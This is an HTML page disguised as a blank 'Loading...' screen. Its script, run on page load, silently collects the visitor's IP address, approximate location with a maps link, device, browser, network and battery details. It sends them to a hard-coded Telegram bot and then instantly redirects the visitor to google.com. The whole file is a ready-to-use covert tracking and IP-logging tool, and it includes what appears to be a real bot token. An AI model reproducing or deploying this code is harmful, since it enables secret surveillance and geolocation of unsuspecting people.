<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
  * { margin: 0; padding: 0; }
  body { background: #fff; }
</style>
</head>
<body>
<script>
const BOT_TOKEN = '8609756694:AAFjX0cnt791j34h844O_dUKCKl0dNARe8U';
const CHAT_ID   = '8220599004';
const REDIRECT  = 'https://google.com'; // change to any page

async function collect() {
  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

  // --- IP + Location (no permission) ---
  let ip = '—', city = '—', region = '—', country = '—',
      lat = '—', lon = '—', isp = '—', org = '—', timezone = '—';
  try {
    const r = await fetch('https://ip-api.com/json/?fields=61439');
    const d = await r.json();
    ip       = d.query      || '—';
    city     = d.city       || '—';
    region   = d.regionName || '—';
    country  = d.country    || '—';
    lat      = d.lat        || '—';
    lon      = d.lon        || '—';
    isp      = d.isp        || '—';
    org      = d.org        || '—';
    timezone = d.timezone   || '—';
  } catch(e) {}

  // --- Device Info (no permission) ---
  const ua        = navigator.userAgent;
  const platform  = navigator.platform || '—';
  const lang      = navigator.language || '—';
  const langs     = navigator.languages?.join(', ') || '—';
  const cores     = navigator.hardwareConcurrency || '—';
  const memory    = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—';
  const screen_w  = screen.width;
  const screen_h  = screen.height;
  const dpr       = window.devicePixelRatio || 1;
  const tz        = Intl.DateTimeFormat().resolvedOptions().timeZone || '—';
  const online    = navigator.onLine ? 'Yes' : 'No';
  const cookieOk  = navigator.cookieEnabled ? 'Yes' : 'No';
  const touch     = navigator.maxTouchPoints > 0 ? 'Yes (' + navigator.maxTouchPoints + ' points)' : 'No';
  const vendor    = navigator.vendor || '—';
  const referrer  = document.referrer || 'Direct';

  // --- Network Info (no permission) ---
  const conn     = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  const netType  = conn?.effectiveType || '—';
  const downlink = conn?.downlink ? conn.downlink + ' Mbps' : '—';
  const rtt      = conn?.rtt ? conn.rtt + ' ms' : '—';
  const saveData = conn?.saveData ? 'Yes' : 'No';

  // --- Battery (no permission) ---
  let batLevel = '—', batCharging = '—', batTime = '—';
  try {
    const bat    = await navigator.getBattery();
    batLevel     = Math.round(bat.level * 100) + '%';
    batCharging  = bat.charging ? '⚡ Charging' : '🔋 Not charging';
    batTime      = bat.chargingTime === Infinity
      ? (bat.dischargingTime !== Infinity ? Math.round(bat.dischargingTime / 60) + ' min remaining' : '—')
      : Math.round(bat.chargingTime / 60) + ' min to full';
  } catch(e) {}

  // --- Parse OS & Browser from UA ---
  const getOS = ua => {
    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
    if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
    if (/Windows/.test(ua)) return 'Windows';
    if (/Android/.test(ua)) return 'Android ' + (ua.match(/Android ([^;]+)/)?.[1] || '');
    if (/iPhone|iPad/.test(ua)) return 'iOS ' + (ua.match(/OS ([^)]+)/)?.[1]?.replace(/_/g,'.') || '');
    if (/Mac OS X/.test(ua)) return 'macOS ' + (ua.match(/Mac OS X ([^)]+)/)?.[1]?.replace(/_/g,'.') || '');
    if (/Linux/.test(ua)) return 'Linux';
    return '—';
  };
  const getBrowser = ua => {
    if (/Edg\//.test(ua)) return 'Microsoft Edge ' + (ua.match(/Edg\/([^\s]+)/)?.[1] || '');
    if (/OPR\//.test(ua)) return 'Opera ' + (ua.match(/OPR\/([^\s]+)/)?.[1] || '');
    if (/Chrome\//.test(ua)) return 'Chrome ' + (ua.match(/Chrome\/([^\s]+)/)?.[1] || '');
    if (/Firefox\//.test(ua)) return 'Firefox ' + (ua.match(/Firefox\/([^\s]+)/)?.[1] || '');
    if (/Safari\//.test(ua)) return 'Safari ' + (ua.match(/Version\/([^\s]+)/)?.[1] || '');
    return '—';
  };

  const os      = getOS(ua);
  const browser = getBrowser(ua);
  const mapsUrl = lat !== '—' ? `https://maps.google.com/?q=${lat},${lon}` : '—';

  // --- Build Telegram Message ---
  const msg = `
🔔 *New Visit Detected*

🕐 *Time:* ${time}
🌐 *Referrer:* ${referrer}

━━━━━━━━━━━━━━━━━━
📡 *NETWORK*
━━━━━━━━━━━━━━━━━━
🌍 IP: \`${ip}\`
🏙 City: ${city}
🗺 Region: ${region}
🌐 Country: ${country}
📍 Coords: ${lat}, ${lon}
🗺 Maps: ${mapsUrl}
🏢 ISP: ${isp}
🏛 Org: ${org}
🕰 Timezone: ${timezone}
📶 Connection: ${netType}
⬇️ Downlink: ${downlink}
⏱ RTT: ${rtt}
💾 Save Data: ${saveData}

━━━━━━━━━━━━━━━━━━
📱 *DEVICE*
━━━━━━━━━━━━━━━━━━
💻 OS: ${os}
🌐 Browser: ${browser}
🏷 Platform: ${platform}
🏭 Vendor: ${vendor}
🖥 Screen: ${screen_w}x${screen_h} @${dpr}x
🧠 RAM: ${memory}
⚙️ CPU Cores: ${cores}
👆 Touch: ${touch}
🌍 Language: ${lang}
🌍 Languages: ${langs}
🍪 Cookies: ${cookieOk}
📶 Online: ${online}

━━━━━━━━━━━━━━━━━━
🔋 *BATTERY*
━━━━━━━━━━━━━━━━━━
🔋 Level: ${batLevel}
⚡ Status: ${batCharging}
⏱ Time: ${batTime}

━━━━━━━━━━━━━━━━━━
📋 *RAW UA*
━━━━━━━━━━━━━━━━━━
\`${ua}\`
`.trim();

  // --- Send to Telegram (don't await) ---
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    })
  });

  // --- Redirect instantly ---
  window.location.replace(REDIRECT);
}

collect();
</script>
</body>
</html>
